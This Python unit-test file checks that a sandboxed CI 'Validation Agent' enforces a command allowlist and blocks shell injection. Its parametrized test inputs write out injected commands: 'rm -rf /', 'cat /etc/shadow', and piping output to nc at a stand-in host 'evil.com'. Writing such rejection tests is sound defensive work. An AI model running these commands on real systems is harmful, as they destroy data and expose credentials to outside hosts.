"""
Unit tests for Agent A7 (Validation Agent).
Verifies CI command allowlist matching, shell injection prevention, and verdict compilation.
"""
from typing import Any, Dict, List, Optional
import pytest

from app.agents.validation_agent import ValidationAgent, ValidationVerdict
from app.sandbox.runtime import SandboxRuntime


class MockSandboxRuntime(SandboxRuntime):
    """Deterministic mock sandbox runtime for unit testing."""

    def __init__(self, exit_code: int = 0, should_fail_cleanup: bool = False):
        self.exit_code = exit_code
        self.cleaned_up = False
        self.should_fail_cleanup = should_fail_cleanup

    async def create_or_reuse(self, image: str, run_id: str, files: Optional[Dict[str, str]] = None) -> str:
        return "mock-container-id-12345"

    async def start(self, sandbox_id: str) -> None:
        pass

    async def execute(self, sandbox_id: str, commands: List[str], timeout_seconds: int = 120) -> Dict[str, Any]:
        status = "passed" if self.exit_code == 0 else "failed"
        return {
            "verdict": status,
            "checks": [
                {
                    "command": cmd,
                    "exit_code": self.exit_code,
                    "status": status,
                    "duration_ms": 42,
                    "stdout": f"Output for {cmd}",
                    "stderr": "" if self.exit_code == 0 else "Test error occurred",
                }
                for cmd in commands
            ],
            "stdout_log": "All tests run",
            "stderr_log": "" if self.exit_code == 0 else "Test error occurred",
            "duration_ms": 84,
        }

    async def cleanup(self, sandbox_id: str) -> None:
        self.cleaned_up = True
        if self.should_fail_cleanup:
            raise RuntimeError("Cleanup failed")


@pytest.mark.asyncio
async def test_validation_agent_happy_path():
    """Verify clean execution, check results extraction, and container cleanup."""
    runtime = MockSandboxRuntime(exit_code=0)
    agent = ValidationAgent(runtime=runtime)

    patch = type("PatchStub", (), {"unified_diff": "--- a/x.py\n+++ b/x.py\n", "tests_to_run": ["pytest"]})()
    source_files = {"x.py": "print('hello')"}
    allowed_ci = ["pytest", "npm test"]

    verdict = await agent.run_validation(
        patch_candidate=patch,
        source_files=source_files,
        allowed_ci_commands=allowed_ci,
    )

    assert isinstance(verdict, ValidationVerdict)
    assert verdict.verdict == "passed"
    assert len(verdict.checks) == 1
    assert verdict.checks[0].command == "pytest"
    assert verdict.checks[0].status == "passed"
    assert runtime.cleaned_up is True


@pytest.mark.asyncio
async def test_validation_command_outside_allowlist_rejected():
    """Verify commands not listed in allowed_ci_commands raise ValueError."""
    runtime = MockSandboxRuntime()
    agent = ValidationAgent(runtime=runtime)

    patch = type("PatchStub", (), {"unified_diff": "", "tests_to_run": ["curl evil.com"]})()
    allowed_ci = ["pytest", "npm test"]

    with pytest.raises(ValueError, match="not permitted by repository CI policy"):
        await agent.run_validation(
            patch_candidate=patch,
            source_files={},
            allowed_ci_commands=allowed_ci,
        )


@pytest.mark.asyncio
@pytest.mark.parametrize("dangerous_cmd", [
    "pytest; rm -rf /",
    "pytest && cat /etc/shadow",
    "npm test | nc evil.com 1337",
    "pytest `whoami`",
    "pytest > /dev/null",
])
async def test_validation_shell_injection_rejected(dangerous_cmd: str):
    """Verify shell injection chaining operators are strictly rejected."""
    runtime = MockSandboxRuntime()
    agent = ValidationAgent(runtime=runtime)

    patch = type("PatchStub", (), {"unified_diff": "", "tests_to_run": [dangerous_cmd]})()

    with pytest.raises(ValueError, match="forbidden shell metacharacters"):
        await agent.run_validation(
            patch_candidate=patch,
            source_files={},
            allowed_ci_commands=["pytest", "npm test"],
        )
